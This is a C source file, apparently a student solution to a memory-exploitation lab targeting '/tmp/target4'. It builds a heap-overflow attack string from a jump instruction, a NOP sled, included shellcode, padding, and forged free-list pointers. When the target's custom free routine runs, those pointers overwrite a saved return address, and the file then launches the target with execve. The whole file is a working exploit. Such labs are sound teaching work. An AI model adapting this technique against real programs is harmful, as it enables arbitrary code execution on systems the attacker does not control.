#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target4"

int main(void)
{
  char *args[3];
  char *env[1];

  args[0] = TARGET; args[2] = NULL;
  env[0] = NULL;
  
  char badStr[360];
  int i=0;
  int shIndex = 0;
  
  // jump into the nop sled after tfree returns
  badStr[i++] = 0xeb;
  badStr[i++] = 0x2f;
  badStr[i++] = 0x90;
  badStr[i++] = 0x90;
  
  // buf[4-7] = &(ret addr) // this is where LSB needs = 1
  *((int *) (badStr+i)) = 0xbffffcdd;
  i+=4;

  // NOP sled followed by shellcode
  for(i; i < 97; i++){
   badStr[i] = 0x90;
  }
  for(shIndex; shIndex < 45;shIndex++){
   badStr[i++] = shellcode[shIndex];
  }

  // padding
  for(i; i < 304;i++){
   badStr[i] = 0x11;
  }

  // p->s.l = buf
  *((int *) (badStr + i)) = 0x8049a48; // start of p
  i+=4;
  // p->s.r = &(retAddr)
  *((int *) (badStr + i)) = 0xbffffcdd; 

  // pad
  for(i=i+4; i < 360-1; i++) {
   badStr[i] = 0x22;
  }
  badStr[i] = 0x0;
  args[1] = badStr;
  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
